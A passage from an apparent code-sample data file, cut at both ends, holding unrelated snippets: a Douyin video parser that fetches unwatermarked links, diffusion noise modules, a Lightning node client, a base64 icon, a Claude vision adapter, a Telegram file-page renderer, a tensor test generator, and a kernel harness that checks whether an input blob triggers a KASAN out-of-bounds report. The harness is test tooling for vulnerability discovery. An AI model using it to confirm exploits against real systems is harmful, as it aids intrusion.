unquote(render_data)  # urldecode\n\n        json_data = json.loads(render_data)\n        data = json_data[\"app\"][\"videoInfoRes\"][\"item_list\"][0]\n        video_url = data[\"video\"][\"play_addr\"][\"url_list\"][0].replace(\"playwm\", \"play\")\n\n        video_info = VideoInfo(\n            video_url=video_url,\n            cover_url=data[\"video\"][\"cover\"][\"url_list\"][0],\n            title=data[\"desc\"],\n            author=VideoAuthor(\n                uid=data[\"author\"][\"unique_id\"],\n                name=data[\"author\"][\"nickname\"],\n                avatar=data[\"author\"][\"avatar_thumb\"][\"url_list\"][0],\n            ),\n        )\n        return video_info\n",
    "import torch\nimport torch.nn as nn\nimport numpy as np\nfrom functools import partial\n\nfrom ldm.modules.diffusionmodules.util import extract_into_tensor, make_beta_schedule\nfrom ldm.util import default\n\n\nclass AbstractLowScaleModel(nn.Module):\n    # for concatenating a downsampled image to the latent representation\n    def __init__(self, noise_schedule_config=None):\n        super(AbstractLowScaleModel, self).__init__()\n        if noise_schedule_config is not None:\n            self.register_schedule(**noise_schedule_config)\n\n    def register_schedule(self, beta_schedule=\"linear\", timesteps=1000,\n                          linear_start=1e-4, linear_end=2e-2, cosine_s=8e-3):\n        betas = make_beta_schedule(beta_schedule, timesteps, linear_start=linear_start, linear_end=linear_end,\n                                   cosine_s=cosine_s)\n        alphas = 1. - betas\n        alphas_cumprod = np.cumprod(alphas, axis=0)\n        alphas_cumprod_prev = np.append(1., alphas_cumprod[:-1])\n\n        timesteps, = betas.shape\n        self.num_timesteps = int(timesteps)\n        self.linear_start = linear_start\n        self.linear_end = linear_end\n        assert alphas_cumprod.shape[0] == self.num_timesteps, 'alphas have to be defined for each timestep'\n\n        to_torch = partial(torch.tensor, dtype=torch.float32)\n\n        self.register_buffer('betas', to_torch(betas))\n        self.register_buffer('alphas_cumprod', to_torch(alphas_cumprod))\n        self.register_buffer('alphas_cumprod_prev', to_torch(alphas_cumprod_prev))\n\n        # calculations for diffusion q(x_t | x_{t-1}) and others\n        self.register_buffer('sqrt_alphas_cumprod', to_torch(np.sqrt(alphas_cumprod)))\n        self.register_buffer('sqrt_one_minus_alphas_cumprod', to_torch(np.sqrt(1. - alphas_cumprod)))\n        self.register_buffer('log_one_minus_alphas_cumprod', to_torch(np.log(1. - alphas_cumprod)))\n        self.register_buffer('sqrt_recip_alphas_cumprod', to_torch(np.sqrt(1. / alphas_cumprod)))\n        self.register_buffer('sqrt_recipm1_alphas_cumprod', to_torch(np.sqrt(1. / alphas_cumprod - 1)))\n\n    def q_sample(self, x_start, t, noise=None):\n        noise = default(noise, lambda: torch.randn_like(x_start))\n        return (extract_into_tensor(self.sqrt_alphas_cumprod, t, x_start.shape) * x_start +\n                extract_into_tensor(self.sqrt_one_minus_alphas_cumprod, t, x_start.shape) * noise)\n\n    def forward(self, x):\n        return x, None\n\n    def decode(self, x):\n        return x\n\n\nclass SimpleImageConcat(AbstractLowScaleModel):\n    # no noise level conditioning\n    def __init__(self):\n        super(SimpleImageConcat, self).__init__(noise_schedule_config=None)\n        self.max_noise_level = 0\n\n    def forward(self, x):\n        # fix to constant noise level\n        return x, torch.zeros(x.shape[0], device=x.device).long()\n\n\nclass ImageConcatWithNoiseAugmentation(AbstractLowScaleModel):\n    def __init__(self, noise_schedule_config, max_noise_level=1000, to_cuda=False):\n        super().__init__(noise_schedule_config=noise_schedule_config)\n        self.max_noise_level = max_noise_level\n\n    def forward(self, x, noise_level=None):\n        if noise_level is None:\n            noise_level = torch.randint(0, self.max_noise_level, (x.shape[0],), device=x.device).long()\n        else:\n            assert isinstance(noise_level, torch.Tensor)\n        z = self.q_sample(x, noise_level)\n        return z, noise_level\n\n\n\n",
    "from abc import (\n    ABC,\n    abstractmethod,\n)\n\nimport aiohttp\nfrom loguru import logger\nfrom pydantic import (\n    BaseModel,\n    Field,\n)\nfrom yarl import URL\n\n\nclass ChannelInfo(BaseModel):\n    state: str\n    channel_id: str = Field(alias=\"channelId\")\n    balance_dat: int = Field(alias=\"balanceSat\", ge=0)\n    inbound_liquidity_sat: int = Field(alias=\"inboundLiquiditySat\", ge=0)\n    capacity_sat: int = Field(alias=\"capacitySat\", ge=0)\n    funding_tx_id: str = Field(alias=\"fundingTxId\")\n\n\nclass GetInfoResponse(BaseModel):\n    node_id: str = Field(alias=\"nodeId\")\n    channels: list[ChannelInfo]\n    chain: str\n    version: str\n\n\nclass GetBalanceResponse(BaseModel):\n    balance_sat: int = Field(alias=\"balanceSat\", ge=0)\n    fee_credit_sat: int = Field(alias=\"feeCreditSat\", ge=0)\n\n\nclass ListChannelsResponse(BaseModel):\n    channels: list[dict]\n\n\nclass CreateInvoiceResponse(BaseModel):\n    amount_sat: int = Field(alias=\"amountSat\", ge=0)\n    payment_hash: str = Field(alias=\"paymentHash\")\n    serialized: str\n\n\nclass PhoenixdClientBase(ABC):\n    @abstractmethod\n    async def getinfo(self) -> GetInfoResponse: ...\n\n    @abstractmethod\n    async def getbalance(self) -> GetBalanceResponse: ...\n\n    @abstractmethod\n    async def listchannels(self) -> ListChannelsResponse: ...\n\n    @abstractmethod\n    async def closechannel(\n        self,\n        *,\n        channel_id: str,\n        address: str,\n        feerate_sat_vbyte: int,\n    ): ...\n\n    @abstractmethod\n    async def createinvoice(\n        self,\n        *,\n        amount_sat: int,\n        description: str | bytes,\n        external_id: str | None = None,\n    ) -> CreateInvoiceResponse: ...\n\n    @abstractmethod\n    async def payinvoice(\n        self,\n        *,\n        invoice: str,\n        amount_sat: int | None = None,\n    ): ...\n\n    @abstractmethod\n    async def sendtoaddress(\n        self,\n        *,\n        address: str,\n        amount_sat: int,\n        feerate_sat_vbyte: int,\n    ): ...\n\n    @abstractmethod\n    async def incoming_payments_external_id(self, external_id: str): ...\n\n    @abstractmethod\n    async def incoming_payment_hash(self, hash: str | bytes): ...\n\n    @abstractmethod\n    async def outgoing_payment_id(self, payment_id: str): ...\n\n    @abstractmethod\n    async def payments_websocket(self): ...\n\n\nclass PhoenixdHttpClient(PhoenixdClientBase):\n    def __init__(\n        self,\n        *,\n        session: aiohttp.ClientSession,\n        phoenixd_url: str | URL,\n    ):\n        self.session = session\n        self.baseurl = (\n            phoenixd_url if isinstance(phoenixd_url, URL) else URL(phoenixd_url)\n        )\n\n    async def getinfo(self) -> GetInfoResponse:\n        async with self.session.get(self.baseurl / \"getinfo\") as response:\n            return GetInfoResponse.parse_obj(await response.json())\n\n    async def getbalance(self) -> GetBalanceResponse:\n        async with self.session.get(self.baseurl / \"getbalance\") as response:\n            return GetBalanceResponse.parse_obj(await response.json())\n\n    async def listchannels(self) -> ListChannelsResponse:\n        async with self.session.get(self.baseurl / \"listchannels\") as response:\n            return ListChannelsResponse.parse_obj(await response.json())\n\n    async def closechannel(\n        self,\n        *,\n        channel_id: str,\n        address: str,\n        feerate_sat_vbyte: int,\n    ):\n        raise NotImplementedError()\n\n    async def createinvoice(\n        self,\n        *,\n        amount_sat: int,\n        description: str | bytes,\n        external_id: str | None = None,\n    ) -> CreateInvoiceResponse:\n        form_data = {\n            \"amountSat\": amount_sat,\n            \"description\": description,\n        }\n        if external_id is not None:\n            form_data[\"externalId\"] = external_id\n        async with self.session.post(\n            self.baseurl / \"createinvoice\",\n            data=form_data,\n        ) as response:\n            invoice = CreateInvoiceResponse.parse_obj(await response.json())\n        logger.info(\n            \"Created invoice {inv_short}... externalId: '{external_id}'\",\n            inv_short=invoice.serialized[:12],\n            external_id=external_id,\n        )\n        logger.debug(\"Invoice: {invoice}\", invoice=invoice)\n        return invoice\n\n    async def payinvoice(\n        self,\n        *,\n        invoice: str,\n        amount_sat: int | None = None,\n    ):\n        raise NotImplementedError()\n\n    async def sendtoaddress(\n        self,\n        *,\n        address: str,\n        amount_sat: int,\n        feerate_sat_vbyte: int,\n    ):\n        raise NotImplementedError()\n\n    async def incoming_payments_external_id(self, external_id: str):\n        raise NotImplementedError()\n\n    async def incoming_payment_hash(self, hash: str | bytes):\n        raise NotImplementedError()\n\n    async def outgoing_payment_id(self, payment_id: str):\n        raise NotImplementedError()\n\n    async def payments_websocket(self):\n        raise NotImplementedError()\n\n\nclass PhoenixdMockClie",
    "img=b'AAABAAEAQEAAAAEAIAAoQgAAFgAAACgAAABAAAAAgAAAAAEAIAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZGwQZGRsaGBgbVhkZG4EZGRunGRkbzRkZG+EZGRvtGRkb+RkZG/kZGRvtGRkb4RkZG80ZGRunGRkbgRgYG1YZGRsaGRkbBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGRsKGRkbPhkZG48YGBvPGRkb/RkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/RgYG88ZGRuPGRkbPhgYGgoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRkbABkZGx4ZGRt+GRkb2xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8YGBvZGRkbfhkZGx4ZGRsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGBgaGhkZG48ZGRvvGRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRvvGRkbjxgYGxoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGRoIGBgbahkZG+kZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRvpGBgaahkZGwgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYGBowGRkbxRkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xgYGv8YGBvFGRkbMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZGwIYGBtoGRkb8RkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/EYGBtoGRkbAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgYGwYYGBuVGRkb/RkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/RkZG5MZGRoGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZGgoZGRurGRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GBgarRkZGwoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZGwwZGRu3GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRu3GRkbDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZGwYZGRqtGRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG60ZGRsGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkZGwIZGRuXGRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkblxkZGwIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGRtiGRkb/RkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/0ZGRtgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGRssGRkb7RkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb7RkZGiwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGRoIGRkbxxkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRkb/xkZG/8ZGRv/GRoc/xobHf8bGx3/Gxsd/xscHv8bHB7/Gxsd/xobHf8aGhz/GRkb/xkZG/",
    "import io\nimport base64\n\nfrom anthropic import Anthropic, InternalServerError\nfrom PIL import Image\nfrom tenacity import *\n\nfrom model_adapters import BaseAdapter\n\n\nclass ClaudeAdapter(BaseAdapter):\n    def __init__(\n        self,\n        client: Anthropic,\n        model: str,\n    ):\n        self.client = client\n        self.model = model\n        \n    @retry(\n        retry=retry_if_exception_type(InternalServerError), \n        stop=(stop_after_attempt(10)), \n        wait=wait_exponential(multiplier=1, min=5, max=300)\n    )\n    def call_llm(\n        self, query, image\n    ):\n        response = self.client.messages.create(\n            model=self.model,\n            messages=[\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\n                            \"type\": \"image\",\n                            \"source\": {\n                                \"type\": \"base64\",\n                                \"media_type\": \"image/png\",\n                                \"data\": f\"{image}\",\n                            },\n                        },\n                        {\n                            \"type\": \"text\", \n                            \"text\": query,\n                        },\n                    ],\n                }\n            ],\n            max_tokens=512,\n            temperature=0.0\n        )\n\n        outputs = response.content[0].text\n        return outputs\n\n    def generate(\n        self,\n        query: str,\n        image: Image,\n        task_type: str,\n    ) -> str:\n        image_data = io.BytesIO()\n        image.save(image_data, format=\"PNG\")\n        image = base64.b64encode(image_data.getvalue()).decode('utf-8')\n\n        outputs = self.call_llm(query, image)\n\n        if task_type == \"element_ocr\" or task_type == \"meta_generate\":\n            if \":\" not in outputs:\n                return outputs\n            outputs = \":\".join(outputs.split(\":\")[1:])\n            outputs = outputs.strip().strip('\"').strip(\"'\")\n            return outputs\n        else:\n            return outputs\n",
    "import jinja2\nfrom info import *\nfrom bStream import biisal_bot\nfrom util.human_readable import humanbytes\nfrom util.file_properties import get_file_ids\nfrom server.exceptions import InvalidHash\nimport urllib.parse\nimport logging\nimport aiohttp\n\n\nasync def render_page(id, secure_hash, src=None):\n    file = await biisal_bot.get_messages(int(BIN_CHNL), int(id))\n    file_data = await get_file_ids(biisal_bot, int(BIN_CHNL), int(id))\n    if file_data.unique_id[:6] != secure_hash:\n        logging.debug(f\"link hash: {secure_hash} - {file_data.unique_id[:6]}\")\n        logging.debug(f\"Invalid hash for message with - ID {id}\")\n        raise InvalidHash\n\n    src = urllib.parse.urljoin(\n        URL,\n        f\"{id}/{urllib.parse.quote_plus(file_data.file_name)}?hash={secure_hash}\",\n    )\n\n    tag = file_data.mime_type.split(\"/\")[0].strip()\n    file_size = humanbytes(file_data.file_size)\n    if tag in [\"video\", \"audio\"]:\n        template_file = \"template/req.html\"\n    else:\n        template_file = \"template/dl.html\"\n        async with aiohttp.ClientSession() as s:\n            async with s.get(src) as u:\n                file_size = humanbytes(int(u.headers.get(\"Content-Length\")))\n\n    with open(template_file) as f:\n        template = jinja2.Template(f.read())\n\n    file_name = file_data.file_name.replace(\"_\", \" \")\n\n    return template.render(\n        file_name=file_name,\n        file_url=src,\n        file_size=file_size,\n        file_unique_id=file_data.unique_id,\n    )\n",
    "import torch\nfrom typing import Generator, Tuple, Dict\nimport itertools\nfrom typing import Tuple, Dict\nimport torch\nimport random\n\nfrom tensorgrad.tensor import Copy, Ones, Tensor, Variable, Zero\n\n\ndef rand_values(variables, **shape):\n    return {v: torch.randn([shape[e] for e in v.edges], names=v.edges) for v in variables}\n\n\ndef assert_close(a, b, rtol=1e-4, atol=1e-5):\n    assert set(a.names) == set(b.names)\n    a = a.align_to(*b.names)\n    torch.testing.assert_close(a.rename(None), b.rename(None), rtol=rtol, atol=atol)\n\n\ndef generate_random_tensor_expression(\n    max_size: int,\n) -> Tuple[Tensor, torch.Tensor, Dict[Variable, torch.Tensor]]:\n    def generate_copy(dim, edges):\n        copy = torch.zeros((dim,) * len(edges))\n        for i in range(dim):\n            copy[(i,) * len(edges)] = 1\n        return copy.rename(*edges)\n\n    def broadcast_tensors(left_torch, right_torch):\n        all_dims = list(set(left_torch.names) | set(right_torch.names))\n        left_aligned = left_torch.align_to(*all_dims)\n        right_aligned = right_torch.align_to(*all_dims)\n        return left_aligned, right_aligned\n\n    def generate_recursive(size: int, variables: Dict[Variable, torch.Tensor]) -> Tuple[Tensor, torch.Tensor]:\n        if size == 1:\n            # Base case: single variable or constant with different edge configurations\n            # if random.random() < 0.5 and variables:\n            if random.random() < 1:\n                var, tensor = random.choice(list(variables.items()))\n                return var, tensor\n            else:\n                tensor_class, torch_func = random.choice(\n                    [(Zero, torch.zeros), (Ones, torch.ones), (Copy, generate_copy)]\n                )\n                edges = random.choice([[\"a\"], [\"a\", \"b\"], [\"a\", \"b\", \"c\"]])\n                if tensor_class == Copy:\n                    dim = random.choice([2, 3])\n                    return tensor_class(edges), torch_func(dim, edges)\n                else:\n                    dims = tuple(random.choice([2, 3]) for _ in range(len(edges)))\n                    return tensor_class(edges), torch_func(dims, names=edges)\n        else:\n            # Recursive case: generate subexpressions and combine them\n            left_size = random.randint(1, size // 2 + 1)\n            right_size = size - left_size\n\n            for _ in range(10):\n                left_tensor, left_torch = generate_recursive(left_size, variables)\n                right_tensor, right_torch = generate_recursive(right_size, variables)\n\n                if random.random() < 0.2:\n                    left_aligned, right_aligned = broadcast_tensors(left_torch, right_torch)\n                    try:\n                        return left_tensor + right_tensor, left_aligned + right_aligned\n                    except RuntimeError as e:\n                        # print(e)\n                        continue\n                else:\n                    contracted = set(left_tensor.edges) & set(right_tensor.edges)\n                    rhs = \"\".join(e for e in left_torch.names + right_torch.names if e not in contracted)\n                    eq = f\"{''.join(left_torch.names)},{''.join(right_torch.names)}->{rhs}\"\n                    try:\n                        torch_result = torch.einsum(eq, left_torch.rename(None), right_torch.rename(None))\n                    except RuntimeError as e:\n                        # print(eq, e)\n                        continue\n                    return left_tensor @ right_tensor, torch_result.rename(*rhs)\n            # Give up\n            raise ValueError(\"Failed to generate random tensor expression\")\n\n    variables = {}\n    ds = {c: random.choice([2, 3]) for c in \"abc\"}\n    for var_name in \"xyztuv\":\n        edges = {\"x\": [\"a\"], \"y\": [\"b\"], \"z\": [\"c\"], \"t\": [\"a\", \"b\"], \"u\": [\"a\", \"b\"], \"v\": [\"a\", \"b\", \"c\"]}[\n            var_name\n        ]\n        # dims = [random.choice([2, 3]) for _ in range(len(edges))]\n        dims = [ds[e] for e in edges]\n        variables[Variable(var_name, edges)] = torch.randn(dims, names=edges)\n\n    while True:\n        try:\n            expr, tensor = generate_recursive(max_size, variables)\n            return expr, tensor, variables\n        except ValueError:\n            continue\n",
    "#!/usr/bin/env python3\n\nimport datetime\nimport getopt\nimport json\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport time\nimport traceback\n\nfrom time import sleep\n\nKERNEL_PATH=\"/src/arch/x86/boot/bzImage\"\nSANITIZER=\"KASAN\"\nTRIGGER=\"KASAN: slab-out-of-bounds\"\nVIRTME_MODS=\"/src/.virtme_mods\"\n\ndef displayHelp():\n    print('test_blob.py --blob_bin <blob_bin> --harness_id <harness_id>')\n\n# Beginning of main\ndef main(argv):\n\n    d = datetime.datetime.now().strftime(\"%Y-%m-%d_%H:%M:%S\")\n    print(\"Start of test: {}\".format(d))\n\n    blob_bin = None\n    harness_id = None\n    try:\n        opts, args = getopt.getopt(argv, \"h:\", [\"blob_bin=\", \"harness_id=\"])\n    except getopt.GetoptError:\n        print('ERROR: parseOptions failed.')\n        displayHelp()\n        sys.exit(2)\n    for opt, arg in opts:\n        if opt == '-h':\n            displayHelp()\n            sys.exit()\n        elif opt in (\"--blob_bin\"):\n            blob_bin = arg\n        elif opt in (\"--harness_id\"):\n            harness_id = arg\n\n    if blob_bin is None:\n        print('ERROR: no blob binary.')\n        displayHelp()\n        sys.exit(2)\n\n    if not (os.path.isfile(blob_bin) and os.access(blob_bin, os.R_OK)):\n        print('ERROR: binary blob file does not exist or is not readable.')\n        displayHelp()\n        sys.exit(2)\n\n    if harness_id is None:\n        print('ERROR: no harness identifier.')\n        displayHelp()\n        sys.exit(2)\n\n    if not (os.path.isfile(harness_id) and os.access(harness_id, os.R_OK)):\n        print('ERROR: harness with supplied id does not exist or is not readable.')\n        displayHelp()\n        sys.exit(2)\n    \n    vulnBinaryFN=harness_id\n    testVulnArgs=blob_bin\n    kernelFN=KERNEL_PATH\n\n    # Delete any pre-existing vulnerability script file\n    vulnFN=vulnBinaryFN+\".sh\"\n    if os.path.isfile(vulnFN):\n        os.remove(vulnFN)\n\n    # Create the vulnerability script file that calls the vulnBinaryFN with testVulnArgs\n    try:\n        vulnFile = open(vulnFN, 'w')\n        vulnFile.write(\"#!/bin/bash\\n\")\n        vulnFile.write(vulnBinaryFN+\" \"+testVulnArgs+\"\\n\")\n        vulnFile.close()\n        os.chmod(vulnFN, 0o550)\n    except Exception:\n        print(\"Exception:\\n %s\", traceback.format_exc())\n        print(\"ERROR: failed to write vulnerability script file '{}'.\".format(vulnFN))\n        sys.exit(2)\n\n\n    print(\"virtme-run --verbose --show-boot-console --kimg {} --memory 2G --mods=auto --script-sh {} >> stdoutData 2> stderrData\".format(kernelFN, vulnFN))\n\n    stdoutData = \"\"\n    stderrData = \"\"\n    try:\n        result = subprocess.run(['virtme-run', '--verbose', '--show-boot-console', '--kimg', kernelFN, \"--memory\", \"2G\", \"--mods=auto\", \"--script-sh\", vulnFN],\n                                capture_output = True, timeout=240)\n        # Get the stdout data as a string\n        stdoutData = result.stdout.decode(\"utf-8\")\n        # Get the stderr data as a string\n        stderrData = result.stderr.decode(\"utf-8\")\n\n        if os.path.isfile(vulnFN):\n            os.remove(vulnFN)\n        if os.path.isdir(VIRTME_MODS):\n            shutil.rmtree(VIRTME_MODS)\n\n    except subprocess.TimeoutExpired as timeErr:\n        print(\"WARNING: Timeout in virtme-run\")\n        os.system('killall /usr/bin/qemu-system-x86_64')\n\n        # Try to get the stdout and stderr data as a string\n        if timeErr.stdout is not None:\n            stdoutData = timeErr.stdout.decode(\"utf-8\")\n        if timeErr.stderr is not None:\n            stderrData = timeErr.stderr.decode(\"utf-8\")\n\n        if os.path.isfile(vulnFN):\n            os.remove(vulnFN)\n        if os.path.isdir(VIRTME_MODS):\n            shutil.rmtree(VIRTME_MODS)\n\n    except Exception:\n        print(\"Unexpected Exception:\\n %s\", traceback.format_exc())\n\n        if os.path.isfile(vulnFN):\n            os.remove(vulnFN)\n        if os.path.isdir(VIRTME_MODS):\n            shutil.rmtree(VIRTME_MODS)\n\n        sys.exit(2)\n\n    logTestData = True\n    success_status = 0\n\n    if TRIGGER in stderrData:\n        print(\"TRIGGERED: Sanitizer triggered: {}\".format(TRIGGER))\n    elif \"KASAN\" in stderrData:\n        print(\"WARNING: Exemplar vuln triggered {} unexpectedly.\".format(\"KASAN\"))\n    elif \"KFENCE\" in stderrData:\n        print(\"WARNING: Exemplar vuln triggered {} unexpectedly.\".format(\"KFENCE\"))\n    elif \"UBSAN\" in stderrData:\n        print(\"WARNING: Exemplar vuln triggered {} unexpectedly.\".format(\"UBSAN\"))\n    else:\n        print(\"NO TRIGGER: No sanitizer was triggered with {}\".format(vulnBinaryFN))\n        \n    if logTestData:\n        print(\"===== VM stdout data begin =====\")\n        print(stdoutData)\n        print(\"===== VM stderr data begin =====\")\n        print(stderrData)\n        print(\"===== VM output data end =====\")\n\n    d = datetime.datetime.now().strftime(\"%Y-%m-%d_%H:%M:%S\")\n    print(\"Test complete: {}\".format(d))\n\n    return success_status\n\nif __name__ == \"__main__\":\n\n    exit_status=0\n\n    try:\n        exit_status = main(sys.argv[1:])\n    except Exception:\n        print(\"Unexpecte",
